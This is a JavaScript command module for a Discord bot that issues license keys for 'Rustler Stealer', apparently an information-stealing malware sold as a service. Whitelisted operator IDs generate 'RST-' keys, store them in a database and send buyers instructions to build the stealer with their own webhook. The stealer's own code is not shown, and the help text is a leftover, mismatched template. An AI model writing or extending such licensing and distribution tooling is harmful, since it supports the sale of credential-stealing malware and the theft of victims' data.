const Discord = require("discord.js");
const moment = require("moment");
const profiles = require("../tables/profiles");
const os = require("os");
var randomstring = require("randomstring");
require("moment-duration-format");

exports.run = async (client, message, args) => {
  const user = message.guild.members.cache.get(args[0]);
  if (!args[0]) {
    message.channel.send("Invalid arguments! Use: $createkey <customerid>")
  } else {
  if (message.author.id == "606159852326223900" || message.author.id == "941416456669773894" || message.author.id == "832192534750429234") { 
  let newData = new profiles({
    userid: user,
    key: "RST-"+randomstring.generate(10),
  });
  newData.save().then();
  const exampleEmbed = new Discord.MessageEmbed()
.setColor('#36393f')
.setAuthor('Rustler Stealer', 'https://media.discordapp.net/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg')
.setDescription(`${user}, Look DM!`)
.setTimestamp()
.setFooter('Rustler Stealer');

  user.send(`👌 Thanks for use Rustler $TEALER! That's your key \`${newData.key}\` :eyes: \n👌 Use: $build <webhook> <key>`)
  message.channel.send(exampleEmbed)
}
}
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["s","key"],
  permLevel: 0
};

exports.help = {
  name: "createkey",
  description: "Botun istatistiklerini gösterir",
  usage: "istatistik"
};